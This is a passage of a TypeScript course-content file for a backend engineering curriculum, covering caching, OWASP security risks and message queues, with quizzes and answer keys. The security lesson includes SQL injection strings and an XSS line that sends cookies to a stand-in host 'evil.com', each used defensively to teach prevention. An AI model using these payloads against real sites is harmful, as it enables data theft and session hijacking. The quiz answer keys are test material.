        content: `## Caching Strategies — The Fastest Query Is the One You Never Make

Caching is the single most impactful performance optimization available to backend engineers. The idea is simple: store the result of an expensive operation so you can reuse it without repeating the operation. The first request is slow (the cache is cold); every subsequent request is fast (served from cache).

Think of it like cooking. Making a meal from scratch takes 30 minutes. Making a batch on Sunday and microwaving portions throughout the week takes 2 minutes per meal. The first cooking session (populating the cache) is expensive, but every subsequent meal (cache hit) is almost instant.

### Cache Layers — Multiple Levels of Speed

Modern applications use multiple cache layers, each faster than the last:

1. **Browser cache** — stored in the user's browser. No network request at all. Controlled by HTTP cache headers. The fastest possible cache.

2. **CDN cache** — stored on edge servers close to the user geographically. A user in Sydney gets content from a Sydney edge server, not your origin server in London. Typical latency: 5-20ms instead of 200-300ms.

3. **Application cache** — stored in Redis or Memcached. Your application checks this before hitting the database. Typical latency: 1-5ms.

4. **Database cache** — the database's own internal query cache and buffer pool. The database caches frequently accessed data in memory automatically.

### Cache-Aside (Lazy Loading) — The Most Common Pattern

The application checks the cache first. If the data is there (cache hit), return it immediately. If not (cache miss), fetch from the database, store in cache for next time, and return it.

\`\`\`typescript
// # Cache-aside pattern — check cache first, fall back to database
async function getUser(userId: string) {
  // # Step 1: Check cache — this takes ~1ms
  const cached = await redis.get(\`user:\${userId}\`);
  if (cached) {
    // # Cache HIT — return immediately without touching the database
    return JSON.parse(cached);
  }

  // # Step 2: Cache MISS — fetch from database (~20-50ms)
  const user = await db.user.findUnique({ where: { id: userId } });
  if (!user) return null;

  // # Step 3: Populate cache for next time
  // # "EX" sets expiration (TTL) in seconds — 3600 = 1 hour
  await redis.set(\`user:\${userId}\`, JSON.stringify(user), "EX", 3600);

  return user;
}
\`\`\`

**Pros:** Only caches data that is actually requested (no wasted memory on unused data).
**Cons:** First request is always a cache miss (cold cache). Data can become stale if the source changes but the cache has not expired yet.

### Write-Through — Always Fresh

Write to the cache AND database simultaneously on every write operation. The cache is always up to date.

\`\`\`typescript
// # Write-through — update both database and cache on every write
async function updateUser(userId: string, data: UserUpdate) {
  // # Step 1: Update database (source of truth)
  const user = await db.user.update({ where: { id: userId }, data });

  // # Step 2: Update cache immediately so it's never stale
  await redis.set(\`user:\${userId}\`, JSON.stringify(user), "EX", 3600);

  return user;
}
\`\`\`

**Pros:** Cache is always fresh — no stale data.
**Cons:** Every write operation is slower (hits both cache and DB). May cache data that is rarely read.

### Cache Invalidation — The Hardest Problem in Computer Science

There is a famous quote in computer science: "There are only two hard things: cache invalidation and naming things." Cache invalidation is hard because you need to answer: "When the source data changes, how and when do I update or remove the cached copy?"

**Three strategies:**

1. **TTL (Time to Live)** — Cache expires after a set duration (e.g., 1 hour). Simple but may serve stale data for up to 1 hour after a change.

2. **Event-based invalidation** — Delete or update the cache entry when the source data changes. Accurate but requires you to track every write and its affected cache keys.

3. **Write-through** — Update the cache on every write (as shown above). Always fresh but adds write latency.

For most applications, use TTL with event-based invalidation: set a reasonable TTL (1 hour) as a safety net, and also delete the cache key whenever the source data changes. This gives you freshness (event-based) with a safety net (TTL ensures even missed invalidations eventually expire).

### HTTP Cache Headers — Browser and CDN Caching

HTTP cache headers tell browsers and CDNs how to cache your responses. Getting these right can eliminate server requests entirely for static content.

\`\`\`
// # Static assets (JS, CSS, images) — cache for 1 year
// # The 'immutable' flag means "don't even revalidate"
Cache-Control: public, max-age=31536000, immutable

// # API responses that change occasionally — cache for 60 seconds
// # stale-while-revalidate lets the browser show stale content
// # while fetching fresh content in the background
Cache-Control: public, max-age=60, stale-while-revalidate=30

// # Private data (user-specific) — only the browser can cache, not CDNs
Cache-Control: private, max-age=300

// # Sensitive data — NEVER cache (login pages, user dashboards)
Cache-Control: no-store
\`\`\`

The difference between \`public\` and \`private\` is critical: \`public\` means CDNs and shared proxies CAN cache the response. If you use \`public\` for a user's dashboard, a CDN might serve User A's dashboard to User B. Use \`private\` for any user-specific data.`,
      },
      {
        title: "Caching & Performance Quiz",
        slug: "caching-quiz",
        type: "quiz" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 10,
        order: 2,
        content: `## Caching & Performance Quiz

<!--quiz
[
  {
    "question": "You cache user profiles in Redis with a 1-hour TTL. A user changes their display name, but other users still see the old name. What pattern solves this?",
    "options": [
      "Increase the cache TTL to 24 hours",
      "Delete or update the cache entry when the user changes their name (event-based invalidation)",
      "Stop using caching entirely",
      "Add a second cache layer"
    ],
    "correctIndex": 1,
    "explanation": "When source data changes, the cache must be invalidated. The most reliable approach is event-based invalidation: when the user updates their name, also delete the cache key (redis.del('user:123')). The next read will be a cache miss, fetch fresh data from the database, and re-cache it. Relying on TTL alone means users see stale data for up to 1 hour after a change."
  },
  {
    "question": "Your API endpoint makes 101 database queries: 1 for 100 posts, then 100 for each post's author. What is this called and how do you fix it?",
    "options": [
      "A race condition — add database locks",
      "The N+1 query problem — use JOINs or eager loading (Prisma: include: { author: true })",
      "A deadlock — increase connection pool size",
      "A cache miss storm — add Redis caching"
    ],
    "correctIndex": 1,
    "explanation": "N+1 is the most common backend performance anti-pattern. Instead of 101 queries, use a JOIN or eager loading to fetch everything in 1-2 queries. In Prisma: findMany({ include: { author: true } }). This can reduce a 500ms endpoint to 5ms. Caching helps but doesn't fix the fundamental issue of making 101 queries when 1-2 would suffice."
  },
  {
    "question": "What's the correct Cache-Control header for a user's private dashboard showing their personal data?",
    "options": [
      "Cache-Control: public, max-age=86400 (CDN can cache it for 1 day)",
      "Cache-Control: private, no-store (only the user's browser, and don't cache)",
      "Cache-Control: public, s-maxage=3600 (CDN caches for 1 hour)",
      "No header needed — browsers don't cache API responses"
    ],
    "correctIndex": 1,
    "explanation": "'private' means only the user's own browser can cache it — NOT CDNs or shared proxies. 'no-store' means don't cache at all, which is appropriate for frequently changing, sensitive user data. Using 'public' would allow CDNs to cache it, meaning User A might see User B's dashboard — a serious privacy and security violation."
  }
]
-->`,
      },
    ],
  },
  /* ============================================================
     MODULE 5: Security
     ============================================================ */
  {
    name: "Backend Security",
    slug: "backend-security",
    description: "OWASP Top 10, input validation, SQL injection, XSS, CSRF, rate limiting, and security headers.",
    order: 5,
    sections: [
      {
        title: "OWASP Top 10 for Backend Engineers",
        slug: "owasp-top-10",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 45,
        order: 1,
        content: `## OWASP Top 10 for Backend Engineers

The OWASP (Open Web Application Security Project) Top 10 is the most important security reference for web developers. It lists the ten most critical web application security risks, updated every few years based on real-world data. Every backend engineer must understand these vulnerabilities and know how to prevent them — a single vulnerability can compromise your entire application and every user's data.

Security is not something you add at the end. It is a fundamental quality of well-engineered software, just like performance or correctness. The cost of fixing a security vulnerability after launch is 10-100x the cost of preventing it during development.

### 1. Injection (SQL, NoSQL, OS Command)

Injection happens when an attacker's input is treated as code instead of data. The most common type is SQL injection, where user input becomes part of a SQL query.

\`\`\`typescript
// # VULNERABLE — user input directly concatenated into SQL
// # If email = "' OR '1'='1" → query returns ALL users
const query = \`SELECT * FROM users WHERE email = '\${email}'\`;

// # What the attacker's query becomes:
// # SELECT * FROM users WHERE email = '' OR '1'='1'
// # The OR '1'='1' condition is always true → returns every row

// # SAFE — parameterized query (the database treats $1 as data, never code)
const user = await db.query("SELECT * FROM users WHERE email = $1", [email]);

// # SAFE — ORM (Prisma parameterizes automatically)
const user = await prisma.user.findUnique({ where: { email } });
\`\`\`

The fundamental principle: NEVER construct queries by concatenating user input. Always use parameterized queries or an ORM. This one rule prevents the most devastating class of web vulnerabilities.

### 2. Broken Authentication

Authentication vulnerabilities let attackers impersonate legitimate users. Common mistakes include allowing weak passwords, not rate-limiting login attempts (enabling brute force attacks), and not expiring sessions after inactivity.

**Prevention checklist:**
- Enforce minimum password length (12+ characters) and check against known breached passwords
- Use bcrypt or argon2 for password hashing with appropriate cost (12+ rounds)
- Rate limit login attempts (5 per minute per IP, lockout after 10 failures)
- Use HTTP-only, Secure, SameSite cookies for session tokens
- Expire sessions after inactivity (30 minutes) and set maximum session lifetime

### 3. Broken Access Control (IDOR)

This happens when your API does not verify that the authenticated user is authorized to access the specific resource they are requesting. It is the most common vulnerability in modern web applications.

\`\`\`typescript
// # VULNERABLE — any authenticated user can see ANY user's billing
// # A user at /api/users/123/billing changes the URL to /api/users/456/billing
// # and sees another user's billing details
app.get("/api/users/:id/billing", async (req, res) => {
  const billing = await db.billing.findUnique({
    where: { userId: req.params.id },
  });
  res.json(billing);
});

// # SAFE — verify the user is accessing THEIR OWN data (or is an admin)
app.get("/api/users/:id/billing", async (req, res) => {
  // # Check: is this user accessing their own resource, or are they an admin?
  if (req.user.id !== req.params.id && req.user.role !== "admin") {
    return res.status(403).json({ error: "Forbidden" });
  }
  const billing = await db.billing.findUnique({
    where: { userId: req.params.id },
  });
  res.json(billing);
});
\`\`\`

### 4. Cross-Site Scripting (XSS)

XSS happens when an attacker injects JavaScript that runs in OTHER users' browsers. If an attacker posts a comment containing \`<script>document.location='evil.com?c='+document.cookie</script>\`, every user who views that comment has their session cookie stolen.

**Prevention:**
- Escape all user-generated output (React does this automatically for JSX)
- Set Content-Security-Policy headers to restrict script sources
- Use HTTP-only cookies (JavaScript cannot read them, so XSS cannot steal session tokens)
- Sanitize HTML input if you must accept it (use a library like DOMPurify, never write your own)

### 5. Security Misconfiguration

This covers all the "obvious" mistakes that are surprisingly common in production:

- Default admin credentials left unchanged
- Debug mode or stack traces exposed in production error responses
- Unnecessary HTTP methods enabled
- Missing security headers
- Sensitive data in error messages

**Essential security headers — set these on every response:**

\`\`\`typescript
// # Security headers that protect against common attacks
app.use((req, res, next) => {
  // # Prevents MIME type sniffing (browser guessing file types)
  res.setHeader("X-Content-Type-Options", "nosniff");
  // # Prevents your page from being loaded in an iframe (clickjacking)
  res.setHeader("X-Frame-Options", "DENY");
  // # Forces HTTPS for all future requests (HSTS)
  res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  // # Controls which resources can load (prevents XSS)
  res.setHeader("Content-Security-Policy", "default-src 'self'");
  // # Controls what information is sent in the Referer header
  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
  next();
});
\`\`\`

### 6. Sensitive Data Exposure

**Rules for handling sensitive data:**

- NEVER log passwords, tokens, API keys, or personally identifiable information
- NEVER return sensitive data in API responses unless absolutely necessary (mask credit card numbers, omit password hashes)
- ALWAYS use HTTPS in production — never transmit sensitive data over plain HTTP
- Encrypt sensitive data at rest (database encryption)
- Mask sensitive data in logs: \`email: j***@example.com\`, \`card: ****4242\`

### Backend Security Checklist

| Category | What to Verify |
|----------|---------------|
| Input | All user input validated with Zod or similar schema validation |
| Passwords | Hashed with bcrypt/argon2, minimum 12 characters, breached password check |
| Auth | Rate limiting on login (5/min), session expiry (30 min inactive) |
| Tokens | JWTs expire in 15 minutes or less, refresh tokens stored securely |
| Access | Every endpoint verifies the user is authorized for THAT specific resource |
| Headers | All security headers set (CSP, HSTS, X-Frame-Options, X-Content-Type-Options) |
| Secrets | No secrets in code, logs, error responses, or client-facing output |
| API | Rate limiting on all public endpoints |
| Database | Parameterized queries only — no string concatenation with user input |
| Errors | Generic error messages in production — detailed errors only in server logs |`,
      },
      {
        title: "Backend Security Quiz",
        slug: "backend-security-quiz",
        type: "quiz" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 10,
        order: 2,
        content: `## Backend Security Quiz

<!--quiz
[
  {
    "question": "A user submits this in a search form: ' OR 1=1 --'. Your backend runs: SELECT * FROM users WHERE name = '[user_input]'. What happens?",
    "options": [
      "Nothing — modern databases are immune to this",
      "SQL injection — the query becomes SELECT * FROM users WHERE name = '' OR 1=1 -- and returns ALL users in the database",
      "The search returns no results because there's no user named that",
      "The database throws a syntax error and the request fails"
    ],
    "correctIndex": 1,
    "explanation": "This is classic SQL injection. The injected ' closes the original string literal, OR 1=1 adds a condition that is always true, and -- comments out the rest of the query. The result: the database returns EVERY user. This could expose names, emails, passwords, and any other data in the users table. Fix: NEVER concatenate user input into SQL. Use parameterized queries or an ORM."
  },
  {
    "question": "Your API error handler returns this to clients: { error: 'QueryFailedError: relation users does not exist', stack: 'at /app/src/db.ts:42:15' }. What's the security problem?",
    "options": [
      "Nothing wrong — detailed errors help with debugging",
      "The error leaks internal implementation details (database engine, table names, file paths) that attackers can use to plan targeted attacks",
      "The error format should be different",
      "The HTTP status code is probably wrong"
    ],
    "correctIndex": 1,
    "explanation": "Internal error details reveal your technology stack to attackers. Database table names help with SQL injection attacks. File paths reveal your directory structure. Framework names and versions reveal known vulnerabilities to exploit. ALWAYS: log the full error server-side (for your debugging), but return a generic message to clients: { error: 'Something went wrong' }. In production, NEVER expose stack traces, database details, or file paths."
  },
  {
    "question": "Which security header prevents your site from being loaded inside an iframe on a malicious site (clickjacking attack)?",
    "options": [
      "Content-Security-Policy: default-src 'self'",
      "X-Frame-Options: DENY (or Content-Security-Policy: frame-ancestors 'none')",
      "X-XSS-Protection: 1; mode=block",
      "Strict-Transport-Security: max-age=31536000"
    ],
    "correctIndex": 1,
    "explanation": "X-Frame-Options: DENY prevents your page from being loaded in ANY iframe. The modern CSP equivalent is frame-ancestors 'none'. Clickjacking works by loading your real page in an invisible iframe, overlaid with a fake UI — the victim thinks they're clicking a harmless button but they're actually clicking a button on YOUR page (like 'Delete Account' or 'Transfer Money'). Frame-busting headers prevent this attack entirely."
  }
]
-->`,
      },
    ],
  },
  /* ============================================================
     MODULE 6: Message Queues & Background Jobs
     ============================================================ */
  {
    name: "Message Queues & Background Jobs",
    slug: "message-queues",
    description: "When to use queues, Redis/BullMQ patterns, event-driven architecture, and reliable job processing.",
    order: 6,
    sections: [
      {
        title: "When and How to Use Message Queues",
        slug: "message-queue-patterns",
        type: "lesson" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 40,
        order: 1,
        content: `## Message Queues & Background Jobs

Not everything should happen during the API request-response cycle. When a user signs up, they expect instant feedback — "Account created!" But behind the scenes, your application needs to send a welcome email, resize their avatar, create their default settings, notify your analytics system, and potentially trigger other workflows. If all of this happens synchronously during the signup request, the user stares at a spinner for 3-5 seconds. That is unacceptable.

Message queues solve this by separating "what needs to happen" from "when it happens." The API adds a job to the queue and immediately responds to the user. A separate worker process picks up the job and executes it in the background. The user sees instant feedback; the work still gets done.

Think of it like a restaurant kitchen. The waiter (API) takes your order (request) and immediately brings you a drink (response). The order goes to the kitchen queue (message queue). The chef (worker) prepares the food (background job) and delivers it when it is ready. The waiter does not stand in the kitchen waiting for the food — they are free to serve other customers.

### When to Use a Queue

**Rule of thumb:** If a task takes more than 500ms or is not required for the API response, put it in a queue.

**Common background job types:**
- Sending emails (welcome, password reset, notifications)
- Processing file uploads (resize images, generate thumbnails, scan for viruses)
- PDF or report generation
- Sending webhooks to external services
- Data aggregation and analytics processing
- Search index updates (re-indexing after content changes)
- Video/audio transcoding
- Cleanup tasks (purging expired sessions, archiving old data)

### The Producer-Consumer Pattern

The fundamental pattern is simple: a producer creates jobs, a queue stores them, and consumers process them.

\`\`\`
Producer (API server) → Queue (Redis / RabbitMQ) → Consumer (Worker process)

Step 1: API receives signup request
Step 2: API creates the user account in the database (fast, ~200ms)
Step 3: API adds a job to the queue: { type: "welcome", userId: "123" }
Step 4: API immediately returns 202 Accepted to the client
Step 5: Worker picks up the job from the queue (seconds later)
Step 6: Worker sends the welcome email
Step 7: Worker marks the job as completed
\`\`\`

The user sees their account created instantly. The email arrives a few seconds later. If the email service is temporarily down, the job stays in the queue and retries — the user's signup is never affected.

### Reliability Patterns — Handling Failure

In a distributed system, things WILL fail. The email service might be down. The worker might crash mid-processing. The network might hiccup. Your queue system must handle all of these gracefully.

**At-least-once delivery:** Most queue systems guarantee that a job will be processed at least once. This means if a worker crashes mid-processing, the job will be re-delivered to another worker. The trade-off is that a job might be processed TWICE (the first worker partially completed it before crashing, and the second worker runs it again).

This means your job handlers MUST be **idempotent** — safe to run multiple times with the same result. The word "idempotent" comes from mathematics and means "applying the operation multiple times has the same effect as applying it once."

\`\`\`typescript
// # IDEMPOTENT — safe to run multiple times
// # If this runs twice for the same user, they get ONE email, not two
async function sendWelcomeEmail(userId: string) {
  const user = await db.user.findUnique({ where: { id: userId } });

  // # Check if we already sent this email
  // # This is the idempotency guard — prevents duplicate sends
  if (user.welcomeEmailSentAt) {
    console.log("Welcome email already sent, skipping");
    return;
  }

  // # Send the email
  await emailService.send(user.email, "Welcome to our platform!");

  // # Record that we sent it — next run of this handler will skip
  await db.user.update({
    where: { id: userId },
    data: { welcomeEmailSentAt: new Date() },
  });
}
\`\`\`

**Retry with exponential backoff:** When a job fails (e.g., the email service returns a 500 error), do not retry immediately — the service is probably still down. Wait, then try again, with increasing delays between attempts:

\`\`\`
Attempt 1: immediate         → fails
Attempt 2: wait 1 second     → fails
Attempt 3: wait 4 seconds    → fails
Attempt 4: wait 16 seconds   → fails
Attempt 5: wait 64 seconds   → fails
→ Job moved to Dead Letter Queue (DLQ) for manual inspection
\`\`\`

### Dead Letter Queue (DLQ) — Where Failed Jobs Go

After a job exhausts all retry attempts, it should NOT be silently dropped. It moves to a Dead Letter Queue — a special queue for permanently failed jobs. This gives you visibility into what went wrong and the ability to fix the issue and replay the failed jobs.

**Always set up alerts on your DLQ.** If jobs are landing there regularly, something is broken.

### Event-Driven Architecture — Loose Coupling

Event-driven architecture takes the queue pattern further: instead of services calling each other directly, they publish events that other services can subscribe to.

\`\`\`
// # Direct calls (tightly coupled) — OrderService must know
// # about EVERY downstream service
OrderService → calls → EmailService
OrderService → calls → InventoryService
OrderService → calls → AnalyticsService

// # Event-driven (loosely coupled) — OrderService publishes
// # ONE event, downstream services subscribe independently
OrderService → emits "order.created" event
  → EmailService listens → sends confirmation email
  → InventoryService listens → decrements stock
  → AnalyticsService listens → records the sale
  → (future) LoyaltyService listens → awards points
\`\`\`

The key benefit: adding a new service (like LoyaltyService) requires ZERO changes to the OrderService. It just subscribes to the "order.created" event. The producer and consumers are completely decoupled — they do not know about each other, do not depend on each other, and can be deployed independently.`,
      },
      {
        title: "Message Queues Quiz",
        slug: "message-queues-quiz",
        type: "quiz" as const,
        difficulty: "intermediate" as const,
        estimatedMinutes: 10,
        order: 2,
        content: `## Message Queues & Background Jobs Quiz

<!--quiz
[
  {
    "question": "Your API endpoint creates a user account, sends a welcome email, resizes their avatar, and logs analytics — total: 3 seconds. Users complain signup is slow. What's the fix?",
    "options": [
      "Optimize the email and image processing code",
      "Move email, avatar resize, and analytics to a background queue — return 202 Accepted immediately after creating the account",
      "Add more servers to handle the load",
      "Show a loading spinner in the frontend"
    ],
    "correctIndex": 1,
    "explanation": "The user only needs the account created (~200ms). The email, avatar resize, and analytics are not needed for the response — they should happen asynchronously in a background queue. The API creates the account, adds background jobs to the queue, and returns 202 Accepted immediately. The user sees instant signup, and the tasks complete in the background within seconds."
  },
  {
    "question": "A background email job fails because the email service is temporarily down. The job retries and sends successfully. Then the original attempt also completes (delayed). The user gets 2 welcome emails. What's the root cause?",
    "options": [
      "The retry logic has a bug",
      "The email service returned incorrect status codes",
      "The job handler is not idempotent — it doesn't check whether the email was already sent before sending again",
      "The queue should guarantee exactly-once delivery"
    ],
    "correctIndex": 2,
    "explanation": "In distributed systems, 'at-least-once' delivery means a job MAY run more than once. Your handler must be idempotent — safe to run multiple times with the same result. Fix: add an idempotency check at the start of the handler: if user.welcomeEmailSentAt is already set, skip the send. This way, even if the job runs 3 times, the email is sent exactly once. Exactly-once delivery is nearly impossible to guarantee in practice."
  },
  {
    "question": "What is a Dead Letter Queue (DLQ) and why is it essential for production systems?",
    "options": [
      "A queue that automatically deletes old messages after 30 days",
      "A separate queue where jobs go after exhausting all retry attempts — for manual inspection, debugging, and potential replay",
      "A backup queue that takes over when the main queue crashes",
      "A high-priority queue reserved for critical system messages"
    ],
    "correctIndex": 1,
    "explanation": "After a job fails all retry attempts (e.g., 5 tries with exponential backoff), it should NEVER be silently dropped. It moves to the Dead Letter Queue where engineers can: inspect what failed and why, fix the underlying bug, and replay the failed jobs once the fix is deployed. Without a DLQ, failed jobs disappear silently, leading to data loss and undiagnosed issues. Always set up alerts when jobs land in the DLQ."
  }
]
-->`,
      },
    ],
  },
];
